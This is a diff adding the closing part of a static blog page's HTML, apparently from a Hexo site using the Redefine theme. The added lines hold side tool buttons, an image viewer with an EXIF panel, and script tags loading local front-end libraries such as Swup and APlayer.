+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="Image viewer">
+	<button class="image-viewer-close" type="button" aria-label="Close">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="Prev">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="Close">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="Next">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
+</div>
+
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+    
+<script src="/js/build/libs/pangu.min.js"></script>
+
+
+
+	
+	<div id="aplayer"></div>
+
+<script src="/js/build/libs/APlayer.min.js"></script>
+
+
+<script src="/js/build/plugins/aplayer.js"></script>
+
+
+	
+</body>
+
+</html>
